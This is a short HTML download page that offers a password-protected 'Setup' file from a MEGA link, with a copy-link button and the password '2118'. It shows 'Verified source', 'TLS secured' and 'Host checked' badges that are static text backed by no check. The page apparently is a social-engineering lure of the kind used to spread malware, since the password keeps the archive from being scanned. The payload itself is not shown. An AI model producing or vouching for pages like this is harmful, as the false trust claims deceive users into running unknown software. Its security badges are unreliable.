<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Page</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-gray-100 flex items-center justify-center min-h-screen">

    <div class="max-w-md w-full p-6 bg-white rounded-2xl shadow-2xl space-y-4 text-center">
        <!-- Security Info -->
        <div class="space-y-1 text-gray-700 font-medium">
            <p>✅ Verified source</p>
            <p>🔒 TLS secured</p>
            <p>🛡️ Host checked</p>
        </div>

        <!-- Request Download -->
        <h2 class="text-xl font-semibold text-gray-900">
            Request Download File
        </h2>
        <p class="text-sm text-gray-600">
            Copy Link and Paste It into a New Tab To Download Setup
        </p>

        <!-- Download Link -->
        <div class="bg-gray-50 p-4 rounded-lg border text-sm text-gray-800 break-words">
            https://mega.nz/file/GSQCGaJT#nFiD3kzGkiBeOD-re6YQ0aDQVokBWXSkYuGGKHBcTeg
        </div>

        <!-- Copy Button -->
        <button
            onclick="navigator.clipboard.writeText('https://mega.nz/file/GSQCGaJT#nFiD3kzGkiBeOD-re6YQ0aDQVokBWXSkYuGGKHBcTeg')"
            class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg shadow-md transition w-full">
            📋 Copy Link
        </button>

        <!-- Password -->
        <div class="bg-gray-200 p-3 rounded-lg text-gray-900 text-center font-semibold">
            Password: <span class="text-red-600">2118</span>
        </div>
    </div>

</body>

</html>
